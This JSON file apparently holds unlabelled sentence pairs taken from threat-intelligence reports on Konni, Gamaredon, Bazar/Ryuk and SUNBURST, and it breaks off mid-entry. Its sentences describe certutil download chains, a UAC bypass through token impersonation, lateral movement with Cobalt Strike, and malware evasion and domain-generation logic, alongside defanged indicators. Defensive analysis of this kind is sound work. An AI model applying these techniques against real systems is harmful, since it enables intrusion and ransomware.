[
    {
        "id": "cti_reports_filtered/r-3.md::S0<=>S47",
        "S1": "In mid-July 2019 I encountered with an emerging campaign delivering the Konni malware.",
        "S2": "I used the James Forshaw\u2019s excellent blog [6] explaining in detail how to bypass UAC using the technique above.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S1<=>S3",
        "S1": "The threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: \u201c\u041e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0430 \u041a\u043e\u0440\u0435\u0439\u0441\u043a\u043e\u043c \u043f\u043e\u043b\u0443\u043e\u0441\u0442\u0440\u043e\u0432\u0435 \u0438 \u043f\u0435\u0440\u0441\u043f\u0435\u043a\u0442\u0438\u0432\u0430\u0445 \u0434\u0438\u0430\u043b\u043e\u0433\u0430 \u043c\u0435\u0436\u0434\u0443 \u0421\u0428\u0410 \u0438 \u041a\u041d\u0414\u0420\u201d (translated to: About the situation on the Korean Peninsula and the prospect of a dialogue between the United States and the DPRK).",
        "S2": "When analyzing the document, we see that the internal codepage of the lure document is 949 \u2014 ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S3<=>S5",
        "S1": "When analyzing the document, we see that the internal codepage of the lure document is 949 \u2014 ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout.",
        "S2": "The lure document contains VBA macro code with the following capabilities:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S5<=>S9",
        "S1": "The lure document contains VBA macro code with the following capabilities:",
        "S2": "The document contains 3 hidden text boxes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S10<=>S57",
        "S1": "Each text box has a hexadecimal string constructed to a command that is executed once the document is opened by the victim.",
        "S2": "This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S14<=>S16",
        "S1": "CMD silently copies certutil.exe into temp directory and rename it to \u201cmx.exe\u201d in an attempt to evade detection and then downloads 1.txt from from a remote resource: http://handicap.eu5[.]org.",
        "S2": "The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S15<=>S18",
        "S1": "The text file contains a base64 encoded string that is decoded by certutil and saved as 1.bat.",
        "S2": "Certutil is executed to download a txt file and decode its content.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S16<=>S26",
        "S1": "The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.",
        "S2": "To check level of permissions, the threat actor uses net.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S26<=>S35",
        "S1": "To check level of permissions, the threat actor uses net.exe.",
        "S2": "The technique used by the threat actor is a full fileless UAC bypass named \u201cCavalry\u201d that was leaked back in March 2017 to WikiLeaks as part of \u201cVault 7\u201d, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3].",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S29<=>S35",
        "S1": "mshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute install.bat with high privileges.",
        "S2": "The technique used by the threat actor is a full fileless UAC bypass named \u201cCavalry\u201d that was leaked back in March 2017 to WikiLeaks as part of \u201cVault 7\u201d, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3].",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S30<=>S32",
        "S1": "To gain higher privileges mshlpweb.dll execute the Windows Update Standalone Installer, wusa.exe.",
        "S2": "mshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity instance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the impersonated user[2], which in turn execute the installer \u2014 install.bat.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S31<=>S36",
        "S1": "This process runs as a high-integrity process by default, since its set to auto-elevate within its manifest.",
        "S2": "This technique also bypasses UAC with the \u201cAlwaysNotify\u201d settings.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S33<=>S42",
        "S1": "mshlpweb.dll utilize a set of standard windows API calls to duplicate the token of wusa.exe and use it to spawn high integrity instance of cmd.exe.",
        "S2": "New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S36<=>S46",
        "S1": "This technique also bypasses UAC with the \u201cAlwaysNotify\u201d settings.",
        "S2": "The credentials passed as arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [4]",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S42<=>S44",
        "S1": "New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.",
        "S2": "The new duplicated token is passed to ImpersonateLoggedOnUser.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S50<=>S52",
        "S1": "- COMSysApp service is added under the \u201cSvcHost\u201d key as a preliminary step to its execution in the context of svchost.exe.",
        "S2": "- COMSysApp service is restarted.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S54<=>S63",
        "S1": "The final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32 directory from the temp directory and then deleted.",
        "S2": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S56<=>S64",
        "S1": "mshlpsrvc.ini is a configuration file that was delivered together with mshlpsrv.dll in earlier stage of the attack.",
        "S2": "Following decoding, the file content appears to be the FTP credentials for the FTP service that acts as the command & control server for this attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S57<=>S63",
        "S1": "This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.",
        "S2": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S59<=>S70",
        "S1": "The following information is gathered from the affected machine and sent back to the control server:",
        "S2": "- files uploaded to the control server using \u201cstor\u201d command.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-3.md::S63<=>S68",
        "S1": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "S2": "- The temp.cab is base64 encoded with the same custom key used earlier.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S0<=>S3",
        "S1": "The case we found arrived through a targeted email that contained a document file (in docx format).",
        "S2": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S0<=>S2",
        "S1": "The case we found arrived through a targeted email that contained a document file (in docx format).",
        "S2": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S1<=>S3",
        "S1": "Opening document starts a template injection technique for loading the document template from the internet.",
        "S2": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S2<=>S10",
        "S1": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "S2": "The downloaded document template (in dot format) could differ slightly depending on each download.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S3<=>S9",
        "S1": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "S2": "Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S5<=>S29",
        "S1": "The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID T1193).",
        "S2": "Our analysis found several URLs of the network destinations for both template injection and VBS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S6<=>S8",
        "S1": "One of them even had the subject \u201cCoronavirus (2019-nCoV).\u201d",
        "S2": "The email that used the coronavirus-related subject came with an attached document file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S9<=>S15",
        "S1": "Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).",
        "S2": "This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S12<=>S21",
        "S1": "As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID T1064), which exports VBS (MITRE ATT&CK framework ID T1064) to execute itself.",
        "S2": "If the file size of \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d exceeds 4,485 bytes, it is executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S14<=>S23",
        "S1": "PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID T1140), which it executes after decrypting the obfuscations.",
        "S2": "The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S15<=>S23",
        "S1": "This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",
        "S2": "The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S25<=>S28",
        "S1": "Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker.",
        "S2": "It shows that this malware is not tested enough, and may still be under development.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S30<=>S33",
        "S1": "While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.",
        "S2": "These IP addresses are from Russian hosting companies.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-51.md::S30<=>S34",
        "S1": "While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.",
        "S2": "Most likely, the attackers rented Virtual Private Server (VPS) as their attack base.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S0<=>S2",
        "S1": "In this case, the actions began via a loader malware known as Bazar/Kegtap.",
        "S2": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S2<=>S4",
        "S1": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "S2": "After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S2<=>S46",
        "S1": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "S2": "Backup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S4<=>S15",
        "S1": "After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day.",
        "S2": "In total, the campaign lasted 29 hours\u2013from initial execution of the Bazar, to domain wide ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S7<=>S9",
        "S1": "Next, the threat actor began to move laterally.",
        "S2": "From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S8<=>S11",
        "S1": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
        "S2": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S8<=>S10",
        "S1": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
        "S2": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S10<=>S14",
        "S1": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
        "S2": "At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S11<=>S13",
        "S1": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
        "S2": "However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S13<=>S17",
        "S1": "However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.",
        "S2": "The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S14<=>S49",
        "S1": "At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller.",
        "S2": "SMB was used to transfer the Ryuk executables.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S15<=>S18",
        "S1": "In total, the campaign lasted 29 hours\u2013from initial execution of the Bazar, to domain wide ransomware.",
        "S2": "Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S17<=>S22",
        "S1": "The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.",
        "S2": "The threat actors also performed process injection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S19<=>S25",
        "S1": "We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.",
        "S2": "We\u2019ve seen adf.bat numerous times and you can read more about it here.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S22<=>S30",
        "S1": "The threat actors also performed process injection.",
        "S2": "Afind was run again, and then the threat actor attempted to Kerberoast using Rubeus.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S27<=>S33",
        "S1": "Nltest was used to check for Domain trusts",
        "S2": "- nltest /dclist:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S31<=>S39",
        "S1": "After a few false starts during lateral movement failures, the threat actors performed some additional local system recon.",
        "S2": "On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S39<=>S42",
        "S1": "On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery.",
        "S2": "From there, the threat actor used WMIC to execute the beacon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S43<=>S46",
        "S1": "This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.",
        "S2": "Backup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S43<=>S50",
        "S1": "This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.",
        "S2": "Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S44<=>S47",
        "S1": "Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.",
        "S2": "The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S47<=>S51",
        "S1": "The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.",
        "S2": "On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-62.md::S51<=>S54",
        "S1": "On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.",
        "S2": "The threat actors asked for more than $6 million but were willing to negotiate.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S0<=>S7",
        "S1": "FireEye has uncovered a widespread campaign, that we are tracking as UNC2452.",
        "S2": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S1<=>S3",
        "S1": "The actors behind this campaign gained access to numerous public and private organizations around the world.",
        "S2": "This campaign may have begun as early as Spring 2020 and is currently ongoing.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S2<=>S6",
        "S1": "They gained access to victims via trojanized updates to SolarWind\u2019s Orion IT monitoring and management software.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S3<=>S5",
        "S1": "This campaign may have begun as early as Spring 2020 and is currently ongoing.",
        "S2": "The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S6<=>S10",
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "S2": "The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S6<=>S9",
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "S2": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S7<=>S17",
        "S1": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.",
        "S2": "The list of known malicious infrastructure is available on FireEye\u2019s GitHub page.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S7<=>S18",
        "S1": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S9<=>S11",
        "S1": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "S2": "Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S9<=>S12",
        "S1": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "S2": "The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S11<=>S16",
        "S1": "Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp",
        "S2": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S16<=>S22",
        "S1": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "S2": "- Subdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victims",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S16<=>S18",
        "S1": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S18<=>S23",
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "S2": "- Command and control traffic masquerades as the legitimate Orion Improvement Program",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S18<=>S20",
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "S2": "The backdoor\u2019s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S18<=>S27",
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "S2": "After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S20<=>S25",
        "S1": "The backdoor\u2019s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files.",
        "S2": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S23<=>S25",
        "S1": "- Command and control traffic masquerades as the legitimate Orion Improvement Program",
        "S2": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S25<=>S31",
        "S1": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S25<=>S27",
        "S1": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "S2": "After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S28<=>S64",
        "S1": "This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework.",
        "S2": "A record of generated domains is checked against a hardcoded list of IP address blocks which control the malware\u2019s behavior.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S30<=>S32",
        "S1": "Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded.",
        "S2": "The file was signed on March 24, 2020.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S31<=>S43",
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed.",
        "S2": "The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S33<=>S35",
        "S1": "On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941.",
        "S2": "The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S37<=>S39",
        "S1": "Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings.",
        "S2": "The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S37<=>S62",
        "S1": "Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings.",
        "S2": "The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S38<=>S43",
        "S1": "The appSettings fields\u2019 keys are legitimate values that the malicious logic re-purposes as a persistent configuration.",
        "S2": "The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S40<=>S45",
        "S1": "The sample checks that the machine is domain joined and retrieves the domain name before execution continues.",
        "S2": "The sample then invokes the method Update which is the core event loop of the sample.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S41<=>S44",
        "S1": "A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.",
        "S2": "This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S45<=>S47",
        "S1": "The sample then invokes the method Update which is the core event loop of the sample.",
        "S2": "The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S45<=>S53",
        "S1": "The sample then invokes the method Update which is the core event loop of the sample.",
        "S2": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S46<=>S49",
        "S1": "The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com.",
        "S2": "The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S47<=>S53",
        "S1": "The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains.",
        "S2": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S48<=>S50",
        "S1": "Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name.",
        "S2": "These subdomains are concatenated with one of the following to create the hostname to resolve:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S49<=>S55",
        "S1": "The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware.",
        "S2": "Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S53<=>S57",
        "S1": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "S2": "If any service was transitioned to disabled the Update method exits and retries later.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S53<=>S58",
        "S1": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "S2": "The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S55<=>S61",
        "S1": "Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated.",
        "S2": "If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S57<=>S59",
        "S1": "If any service was transitioned to disabled the Update method exits and retries later.",
        "S2": "If any blocklisted driver is seen the Update method exits and retries.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S58<=>S60",
        "S1": "The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver.",
        "S2": "If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S62<=>S66",
